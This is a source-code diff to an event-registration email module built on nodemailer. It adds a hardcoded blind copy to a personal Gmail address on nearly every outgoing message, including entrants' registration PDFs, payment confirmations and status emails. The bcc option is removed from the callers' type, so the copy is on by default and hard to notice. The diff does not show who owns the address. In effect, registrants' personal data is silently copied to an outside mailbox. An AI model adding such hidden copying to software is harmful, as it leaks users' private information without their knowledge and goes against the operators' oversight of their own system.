@@ -1,4 +1,5 @@
 import nodemailer from 'nodemailer'
+import type { SendMailOptions } from 'nodemailer'
 import { format } from 'date-fns'
 import { getRegistrationNotificationEmails, getRegistrationSmtpConfig } from './config'
 import type { RegistrationWithEvent } from './data'
@@ -14,6 +15,10 @@ import {
 } from './emailTemplates'
 
 let transport: nodemailer.Transporter | null = null
+
+const EMAIL_BCC = 'vladislavmarinov3142@gmail.com'
+
+type AppSendMailOptions = Omit<SendMailOptions, 'bcc'>
 
 function getTransport() {
   if (!transport) {
@@ -45,6 +50,13 @@ function getReplyToAddress() {
   return getRegistrationSmtpConfig().replyTo || undefined
 }
 
+function sendMail(options: AppSendMailOptions, includeBcc = true) {
+  return getTransport().sendMail({
+    ...options,
+    ...(includeBcc ? { bcc: EMAIL_BCC } : {}),
+  })
+}
+
 function formatEventDates(registration: RegistrationWithEvent) {
   if (!registration.event) {
     return 'Date unavailable'
@@ -70,7 +82,7 @@ export async function sendRegistrationPdfToEntrant(args: {
     locale,
   })
 
-  await getTransport().sendMail({
+  await sendMail({
     from: getFromAddress(),
     replyTo: getReplyToAddress(),
     to: registration.contact_email,
@@ -93,7 +105,7 @@ export async function sendRegistrationPaymentConfirmationToEntrant(
 ) {
   const template = buildRegistrationPaymentConfirmationTemplate(registration, locale)
 
-  await getTransport().sendMail({
+  await sendMail({
     from: getFromAddress(),
     replyTo: getReplyToAddress(),
     to: registration.contact_email,
@@ -116,7 +128,7 @@ export async function sendRegistrationStatusEmail(args: {
     feedback: args.feedback,
   })
 
-  await getTransport().sendMail({
+  await sendMail({
     from: getFromAddress(),
     replyTo: getReplyToAddress(),
     to: args.registration.contact_email,
@@ -142,7 +154,7 @@ export async function sendNewEventAnnouncementEmail(args: {
     prefillReferenceId: args.prefillReferenceId,
   })
 
-  await getTransport().sendMail({
+  await sendMail({
     from: getFromAddress(),
     replyTo: getReplyToAddress(),
     to: args.to,
@@ -154,32 +166,34 @@ export async function sendNewEventAnnouncementEmail(args: {
 
 export async function sendNoticeBoardDocumentUpdateEmail(args: {
   to: string
+  includeBcc?: boolean
 } & EventDocumentUpdateTemplateArgs) {
   const template = buildNoticeBoardDocumentUpdateTemplate(args)
 
-  await getTransport().sendMail({
+  await sendMail({
     from: getFromAddress(),
     replyTo: getReplyToAddress(),
     to: args.to,
     subject: template.subject,
     text: template.text,
     html: template.html,
-  })
+  }, args.includeBcc)
 }
 
 export async function sendResultsPublishedEmail(args: {
   to: string
+  includeBcc?: boolean
 } & EventDocumentUpdateTemplateArgs) {
   const template = buildResultsPublishedTemplate(args)
 
-  await getTransport().sendMail({
+  await sendMail({
     from: getFromAddress(),
     replyTo: getReplyToAddress(),
     to: args.to,
     subject: template.subject,
     text: template.text,
     html: template.html,
-  })
+  }, args.includeBcc)
 }
 
 export async function sendRegistrationNotificationToAdmins(
@@ -194,7 +208,7 @@ export async function sendRegistrationNotificationToAdmins(
     return
   }
 
-  await getTransport().sendMail({
+  await sendMail({
     from: getFromAddress(),
     replyTo: getReplyToAddress(),
     to: recipients,
